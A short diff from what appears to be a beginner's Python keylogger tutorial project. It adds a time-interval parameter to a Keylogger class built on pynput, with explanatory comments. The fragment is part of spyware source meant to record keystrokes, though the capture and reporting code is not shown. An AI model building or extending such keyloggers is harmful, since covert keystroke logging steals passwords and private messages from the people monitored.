@@ -7,9 +7,11 @@ import pynput.keyboard
 import threading
 
 class Keylogger: #class names start with capital letter conventionally
-    def __init__(self): #create constructor method
+    def __init__(self, time_interval): #create constructor method
         #any code under here will automatically be executed
         self.log = "" #create an attribute log
+        self.interval = time_interval #value required to be passed to Keylogger when running from other code
+        #ie my_keylogger = keylog.Keylogger(5) - passes interval of 5
         print("Constructor method")
         
     def append_to_log(self, string):
